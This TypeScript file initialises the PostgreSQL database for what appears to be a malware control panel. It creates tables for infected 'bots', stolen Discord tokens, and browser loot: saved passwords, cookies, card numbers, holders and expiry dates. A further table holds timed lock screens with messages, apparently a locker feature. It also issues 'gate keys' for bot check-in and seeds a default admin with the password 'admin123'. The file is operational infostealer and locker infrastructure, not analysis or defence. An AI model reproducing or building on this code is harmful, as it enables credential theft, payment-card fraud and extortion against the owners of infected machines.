import { Pool } from 'pg';
import bcrypt from 'bcryptjs';
import crypto from 'crypto';
import dotenv from 'dotenv';

dotenv.config();

export const pool = new Pool({
  connectionString: process.env.DATABASE_URL
});

export const generateGateKey = (): string => {
  return 'GATE-' + crypto.randomBytes(8).toString('hex').toUpperCase();
};

export const generateDeviceKey = (): string => {
  return 'DEV-' + crypto.randomBytes(6).toString('hex').toUpperCase();
};

export const initDb = async (): Promise<void> => {
  try {
    await pool.query(`
      CREATE TABLE IF NOT EXISTS users (
        id SERIAL PRIMARY KEY,
        username VARCHAR(50) UNIQUE NOT NULL,
        password VARCHAR(255) NOT NULL,
        role VARCHAR(20) DEFAULT 'admin',
        gate_key VARCHAR(64) UNIQUE NOT NULL,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
      );
    `);

    await pool.query(`
      CREATE TABLE IF NOT EXISTS bots (
        id SERIAL PRIMARY KEY,
        user_id INT REFERENCES users(id) ON DELETE CASCADE,
        device_key VARCHAR(64) UNIQUE,
        ip VARCHAR(50),
        pc_name VARCHAR(100),
        os_info VARCHAR(100),
        status VARCHAR(20) DEFAULT 'offline',
        last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP
      );
    `);

    try {
      await pool.query('ALTER TABLE bots ADD COLUMN IF NOT EXISTS device_key VARCHAR(64) UNIQUE');
    } catch (e) {}

    try {
      await pool.query('ALTER TABLE bots DROP COLUMN IF EXISTS port');
    } catch (e) {}

    await pool.query(`
      CREATE TABLE IF NOT EXISTS discord_tokens (
        id SERIAL PRIMARY KEY,
        bot_id INT REFERENCES bots(id) ON DELETE CASCADE,
        pc_name VARCHAR(100),
        token TEXT UNIQUE NOT NULL,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
      );
    `);

    await pool.query(`
      CREATE TABLE IF NOT EXISTS active_locks (
        id SERIAL PRIMARY KEY,
        pc_name VARCHAR(100) NOT NULL,
        title TEXT,
        message TEXT,
        lock_until TIMESTAMP NOT NULL,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
      );
    `);

    await pool.query(`
      CREATE TABLE IF NOT EXISTS browser_data (
        id SERIAL PRIMARY KEY,
        bot_id INT REFERENCES bots(id) ON DELETE CASCADE,
        pc_name VARCHAR(100) NOT NULL,
        data_type VARCHAR(20) NOT NULL,
        browser VARCHAR(50),
        host TEXT,
        username TEXT,
        password TEXT,
        cookie_name TEXT,
        cookie_value TEXT,
        card_number VARCHAR(100),
        card_holder TEXT,
        expiry VARCHAR(20),
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
      );
    `);

    try {
      await pool.query('ALTER TABLE browser_data ALTER COLUMN host TYPE TEXT');
      await pool.query('ALTER TABLE browser_data ALTER COLUMN username TYPE TEXT');
      await pool.query('ALTER TABLE browser_data ALTER COLUMN cookie_name TYPE TEXT');
      await pool.query('ALTER TABLE browser_data ALTER COLUMN card_holder TYPE TEXT');
    } catch (e) {}

    await pool.query(`
      CREATE INDEX IF NOT EXISTS idx_browser_data_bot_id ON browser_data(bot_id);
    `);
    await pool.query(`
      CREATE INDEX IF NOT EXISTS idx_browser_data_type ON browser_data(data_type);
    `);

    try {
      await pool.query('ALTER TABLE users ADD COLUMN IF NOT EXISTS gate_key VARCHAR(64) UNIQUE');
    } catch (e) {
    }

    const usersWithoutKey = await pool.query('SELECT id FROM users WHERE gate_key IS NULL');
    for (const u of usersWithoutKey.rows) {
      const gateKey = generateGateKey();
      await pool.query('UPDATE users SET gate_key = $1 WHERE id = $2', [gateKey, u.id]);
      console.log(`⚡ Kullanıcı (ID: ${u.id}) için Gate Key üretildi: ${gateKey}`);
    }

    const anyUserCheck = await pool.query('SELECT id FROM users LIMIT 1');
    if (anyUserCheck.rows.length === 0) {
      const hashedPassword = await bcrypt.hash('admin123', 10);
      const gateKey = generateGateKey();
      await pool.query(
        'INSERT INTO users (username, password, role, gate_key) VALUES ($1, $2, $3, $4)',
        ['admin', hashedPassword, 'admin', gateKey]
      );
      console.log('⚡ İlk Admin kullanıcı oluşturuldu. Gate Key:', gateKey);
    }

    console.log('✅ PostgreSQL Veritabanı Mimarisi Başarıyla Başlatıldı.');
  } catch (err) {
    console.error('❌ Veritabanı başlatma hatası:', err);
    throw err;
  }
};